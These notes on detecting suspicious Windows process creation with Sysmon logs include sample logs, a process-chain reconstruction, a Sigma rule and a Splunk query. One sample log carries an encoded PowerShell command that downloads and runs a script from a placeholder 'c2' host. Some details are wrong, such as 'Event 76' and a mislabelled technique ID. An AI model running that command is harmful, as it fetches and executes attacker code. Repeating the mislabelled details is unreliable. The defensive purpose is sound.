Elaborated Notes with Examples
1. Suspicious Process Creation

Sysmon Event ID 1 (ProcessCreate) captures every process creation event. Key fields: CommandLine, ParentImage, Image, User, ProcessId, Hashes. Detection focuses on unusual parent-child relationships (e.g., winword.exe spawning cmd.exe), processes launched from suspicious locations (%TEMP%, %APPDATA%, %LOCALAPPDATA%), and unsigned binaries.

Example: Sysmon Event 1 log:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-06-17 08:46:12.345
ProcessGuid: {A1B2C3D4-E5F6-7890-ABCD-EF1234567890}
ProcessId: 4567
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\Users\victim\Desktop\Invoice_2026.docm"
User: CORP\victim
This is a textbook macro -> cmd -> powershell chain. The parent is WINWORD.EXE (signed by Microsoft), child is cmd.exe (also signed), but the command line reveals the malicious base64 payload.
2. Unsigned Processes from Temp

Windows native executables are digitally signed by Microsoft. Detection rule: unsigned executables running from user-writable locations (%TEMP%, %APPDATA%, %LOCALAPPDATA%, %USERPROFILE%\Downloads) have high suspicion, especially when spawned by Office products, browsers, or scripting interpreters.

Example: Sysmon Event 1 (with check for signature):
Image: C:\Users\victim\AppData\Local\Temp\svchost.exe
Signed: N/A (no signature)
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: rundll32.exe C:\Users\victim\AppData\Local\Temp\dll.dll,Install
The file svchost.exe is in the temp directory with a name mimicking a system process. It is unsigned. The parent chain shows winword.exe -> mshta.exe -> rundll32.exe -> svchost.exe. Each parent is signed but the final child is unsigned and in a user-writable location. The EDR tags this as "Process from suspicious location — unsigned binary" with an alert score of 9/10.
3. Parent-Child Chain Analysis

Analyzing process ancestry reveals attack techniques. Legitimate chains: explorer.exe -> winword.exe (user opens Office doc). Malicious: winword.exe -> cmd.exe -> powershell.exe -> rundll32.exe. Chain analysis in SIEM: correlate Event IDs 1 (ProcessCreate) and group by ProcessGuid matching ParentProcessGuid.

Example Chain Reconstruction:
(1) explorer.exe (PID: 1000) -> WINWORD.EXE (PID: 2000) C:\Users\victim\Desktop\Invoice.docm
(2) WINWORD.EXE (PID: 2000) -> cmd.exe (PID: 3000) cmd /c powershell.exe -enc ...
(3) cmd.exe (PID: 3000) -> powershell.exe (PID: 4000) powershell -enc ...
(4) powershell.exe (PID: 4000) -> rundll32.exe (PID: 5000) rundll32 C:\Users\victim\AppData\Local\Temp\dll.dll,DllMain
(5) rundll32.exe (PID: 5000) -> svchost.exe (PID: 6000) C:\Users\victim\AppData\Local\svchost.exe
(6) svchost.exe (PID: 6000) -> powershell.exe (PID: 7000) powershell -enc ...(mimikatz)...
The chain shows the full kill chain: phishing -> macro -> powershell download -> DLL sideload -> persistence -> credential theft. The analyst can write a detection rule: WINWORD.EXE spawning ANY of (cmd.exe, powershell.exe, wscript.exe, cscript.exe, mshta.exe, regsvr32.exe, rundll32.exe).
4. Detection Rules & Tuning

Effective rules for Event 76 detections: (1) Unsigned executable in user-writable path. (2) Unusual parent-child relationships (Office -> cmd/powershell). (3) Process spawned from %TEMP% with a name mimicking system processes (svchost.exe, rundll32.exe, explorer.exe). (4) Processes with no valid signature but masquerading as Microsoft-signed processes.

Example Sigma Rule:
title: Suspicious Process from Temp by Office
logsource: category: process_creation
detection:
  selection:
    ParentImage|endswith: '\WINWORD.EXE'
    Image|contains: '\Temp\'
  condition: selection
falsepositives:
  - Internal tools that drop executables to temp (should be excluded)
level: high
When deployed in Splunk: index=windows sourcetype="WinEventLog:Sysmon" EventCode=1 ParentImage="*WINWORD.EXE" Image="*\\Temp\\*" | table _time, ComputerName, User, Image, CommandLine. The analyst tunes by excluding known IT tools: NOT (Image="*\\Temp\\ITDeploy*" OR Hashes="*KNOWN_GOOD_HASH*").
